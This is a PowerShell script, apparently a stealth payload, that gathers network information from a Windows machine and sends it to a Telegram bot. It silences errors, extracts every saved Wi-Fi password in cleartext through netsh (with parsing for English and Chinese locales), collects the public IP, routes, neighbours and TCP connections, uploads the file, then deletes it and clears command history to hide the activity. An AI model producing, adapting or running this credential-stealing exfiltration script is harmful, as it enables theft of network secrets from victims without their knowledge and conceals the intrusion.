# Get-Network-Info_zh-CN
Set-StrictMode -Off
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

$token = "YOUR_BOT_TOKEN_FOR_TELEGRAM"
$url = "https://api.telegram.org/bot$token"
$outpath = "$env:TEMP/netinfo.txt"
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    sleep 5
}

$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
Function Post-Message{$script:params = @{chat_id = $chatID ;text = $contents};Invoke-WebRequest -Uri ($url + "/sendMessage") -Method POST -Body $params | Out-Null}
Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO.File]::ReadAllBytes($outpath);$fileEncoding = [System.Text.Encoding]::GetEncoding("UTF-8").GetString($fileBytes);$boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n";$bodyLines = ( "--$boundary","Content-Disposition: form-data; name=`"chat_id`"$LF","$chatID$LF","--$boundary","Content-Disposition: form-data; name=`"document`"; filename=`"$filename`"","Content-Type: application/octet-stream$LF","$fileEncoding","--$boundary--$LF" ) -join $LF;Invoke-WebRequest -Uri ($url + "/sendDocument") -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null}

$contents = "$comp Gathering Network Information for $env:COMPUTERNAME $comp"
Post-Message

$PublicIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
"Public IP Address: $PublicIP`n" | Out-File -FilePath $outpath -Append

"`nAll WiFi Tokens:`n" | Out-File -FilePath $outpath -Append
if ($systemLanguage -eq "en-US") {
    netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
        $ssid = [string]$_.Matches.Value
        $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=Key Content\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
        if([String]::IsNullOrEmpty($psk)){$psk = "None"}
        Write-Output ("SSID: $ssid | PSK: $psk")
    } | Out-File -FilePath $outpath -Append
}
elseif ($systemLanguage -eq "zh-CN") {
    netsh wlan show profile | Select-String '(?<=\u6240\u6709\u7528\u6237\u914d\u7f6e\u6587\u4ef6\s+:\s).+' | ForEach-Object {
        $ssid = [string]$_.Matches.Value
        $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=\u5173\u952e\u5185\u5bb9\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
        if([String]::IsNullOrEmpty($psk)){$psk = "None"}
        Write-Output ("SSID: $ssid | PSK: $psk")
    } | Out-File -FilePath $outpath -Append
}
else {
    "Not supported system" | Out-File -FilePath $outpath -Append
}

"`nAll Network Interfaces:" | Out-File -FilePath $outpath -Append
Get-NetIPInterface | Out-File -FilePath $outpath -Append

"Network IP Configuration:" | Out-File -FilePath $outpath -Append
Get-NetIPConfiguration | Out-File -FilePath $outpath -Append

"Network Route Configuration:" | Out-File -FilePath $outpath -Append
Get-NetRoute | Out-File -FilePath $outpath -Append

"Network Neighbor Configuration:" | Out-File -FilePath $outpath -Append
Get-NetNeighbor | Out-File -FilePath $outpath -Append

"Network TCP Connections:" | Out-File -FilePath $outpath -Append
Get-NetTCPConnection | Out-File -FilePath $outpath -Append

Post-File

Remove-Item -Path $outpath -Force
Clear-History
